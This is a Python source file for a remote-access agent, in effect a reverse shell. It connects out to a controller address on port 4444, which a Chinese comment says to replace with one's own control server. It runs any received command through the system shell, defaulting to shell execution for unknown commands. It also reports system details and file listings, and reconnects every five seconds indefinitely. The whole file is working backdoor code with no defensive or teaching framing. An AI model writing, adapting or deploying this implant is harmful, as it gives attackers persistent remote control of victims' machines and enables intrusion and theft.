import socket
import subprocess
import platform
import os
import struct
import time
import json

def send_packet(sock, msg_bytes):
    sock.sendall(struct.pack('!I', len(msg_bytes)) + msg_bytes)

def handle_command(command):
    try:
        parts = command.split(' ', 1)
        action = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if action == 'sysinfo':
            info = f"OS: {platform.system()} {platform.release()}\nNode: {platform.node()}\nMachine: {platform.machine()}"
            return info.encode('utf-8')
        
        elif action == 'ls':
            path = arg if arg else "."
            files = os.listdir(path)
            return "\n".join(files).encode('utf-8')
        
        elif action == 'shell':
            proc = subprocess.Popen(arg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            res = out + err
            return res if res else b"[+] Command executed (no output)\n"
        
        else:
            # 默认当作 shell 命令执行
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            res = out + err
            return res if res else b"[+] Command executed (no output)\n"

    except Exception as e:
        return f"[-] Execution Error: {str(e)}".encode('utf-8')

def run_universal_agent():
    target_ip = "127.0.0.1"  # 可替换为你的主控端 IP
    target_port = 4444

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))

            while True:
                length_data = s.recv(4)
                if not length_data:
                    break
                msg_length = struct.unpack('!I', length_data)[0]

                data = b""
                while len(data) < msg_length:
                    packet = s.recv(msg_length - len(data))
                    if not packet:
                        break
                    data += packet

                try:
                    req = json.loads(data.decode('utf-8', errors='ignore'))
                    command = req.get("command", "")
                except:
                    command = data.decode('utf-8', errors='ignore')

                if command.lower() == 'exit':
                    break

                response = handle_command(command)
                send_packet(s, response)

        except Exception:
            time.sleep(5)  # 断线自动重连，永不崩塌
            continue

if __name__ == '__main__':
    run_universal_agent()
